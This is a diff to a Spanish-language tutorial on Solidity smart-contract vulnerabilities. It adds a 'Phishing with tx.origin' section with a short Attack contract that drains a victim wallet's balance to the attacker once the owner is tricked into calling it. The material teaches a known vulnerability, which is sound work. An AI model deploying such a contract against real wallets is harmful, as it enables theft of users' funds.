@@ -184,7 +184,23 @@ En el ejemplo señalado usa la funcion atacante, para enviar el valor, pero fall
         kingOfEther.claimThrone{value: msg.value}();
     }
 ```
-## Phishing with tx.origin
+## Phishing with tx.origin // Phishing con el origen de la transacción
 
-    
+Un contrato malintencionado puede engañar al propietario de un contrato para que llame a una función que solo el propietario debería poder llamar.
+Usando la función a continuación puedes atacar usando la wallet mediante el tx.origin
+```solidity
+contract Attack {
+    address payable public owner;
+    Wallet wallet;
+
+    constructor(Wallet _wallet) {
+        wallet = Wallet(_wallet);
+        owner = payable(msg.sender);
+    }
+
+    function attack() public {
+        wallet.transfer(owner, address(wallet).balance);
+    }
+}
+```
 
